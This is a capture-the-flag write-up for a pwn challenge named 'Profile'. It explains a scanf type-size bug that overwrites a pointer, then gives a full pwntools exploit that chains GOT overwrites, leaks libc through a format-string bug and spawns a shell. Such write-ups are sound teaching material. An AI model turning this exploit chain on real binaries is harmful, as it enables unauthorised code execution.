"Profile" was the first pwn challenge in the event.
One thing I liked is that we are given source code in the pwn chals:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

struct person_t {
  int id;
  int age;
  char *name;
};

void get_value(const char *msg, void *pval) {
  printf("%s", msg);
  if (scanf("%ld%*c", (long*)pval) != 1)
    exit(1);
}

void get_string(const char *msg, char **pbuf) {
  size_t n;
  printf("%s", msg);
  getline(pbuf, &n, stdin);
  (*pbuf)[strcspn(*pbuf, "\n")] = '\0';
}

int main() {
  struct person_t employee = { 0 };

  employee.id = rand() % 10000;
  get_value("Age: ", &employee.age);
  if (employee.age < 0) {
    puts("[-] Invalid age");
    exit(1);
  }
  get_string("Name: ", &employee.name);
  printf("----------------\n"
         "ID: %04d\n"
         "Name: %s\n"
         "Age: %d\n"
         "----------------\n",
         employee.id, employee.name, employee.age);

  free(employee.name);
  exit(0);
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  srand(time(NULL));
}

```

This code does a really basic thing:
It will ask the user for age and name and create a new `person_t` struct with those values.
At first, I told myself that there was no vulnerability here, but after re-reading the code, I saw it:
The `person_t` struct is built like this:
```c
struct person_t {
  int id;
  int age;
  char *name;
};
```
So age is an int, which means it contains just 4 bytes.
Then, when we call `get_value("Age: ", &employee.age);`, `scanf("%ld%*c", (long*)pval) != 1` will be called.
That's a bug! The `%ld` format string means that a long will be inputted, which is 8 bytes!
With this bug, we can overwrite the `name` variable pointer!
This will give us an arbitrary write primitive, because we will use the `get_string` function to write to `&employee.name` which we control!

*Exploitation*

After running `checksec` on the binary, we can see that the binary is `Partial Relro`, and `non PIE`. this means, that the got is marked as rw, so we can use our primtive to write there.

Firstly, I overwrote `got.free`, to `main`, which will give us an infinite arbitrary writes, because each time the functions ends, it will start over again.
I didn't overwrote `got.exit` yet, because if `free` will be called with name, it will crash because of a check in free which checks for a size field in the chunk.
With our second arbitrary write, I overwrote `got.exit` with main, and then with our third one, I overwrote `got.free` with `got.printf`, and we get a fsb since free is called with out input!

With the fsb, we can easilly get leaks, of libc.
And lastly we'll overwrite `free` again with `system`, and win.

```py
from pwn import *

e = ELF("./profile")
p = process("./profile")
#p = remote("54.78.163.105" , 31540)
libc = ELF("./libc.so.6")

address = e.got.free
p.sendlineafter("Age: ", str((address << 32) + 1))
p.sendafter(b': ', p32(e.sym['main'])[:-1]+b'\x0a')

address = e.got.exit
p.sendlineafter("Age: ", str((address << 32) + 1))
p.sendafter(b': ', p32(e.sym['main'])[:-1]+b'\x0a')

address = e.got.free
p.sendlineafter("Age: ", str((address << 32) + 1))
p.sendafter(b': ', p32(e.sym["printf"])[:-1]+b'\x0a')


p.sendlineafter("Age: ", "1")
p.sendafter(b': ', "%p|%p|%p"+'\x0a')

p.recvuntil("1\n----------------\n")

leaks = p.recvuntil(b"Age").replace(b"Age", b"").split(b"|")
leak = int(leaks[-1], 16) - 0x114a37

libc.address = leak

print(hex(libc.sym.system))

#p.interactive()
address = e.got.free
p.sendlineafter(": ", str((address << 32) + 1))
p.sendlineafter(b': ', p64(libc.sym.system)[:-2])

p.sendline("1")
p.sendline("/bin/sh")

p.interactive()
```
אי
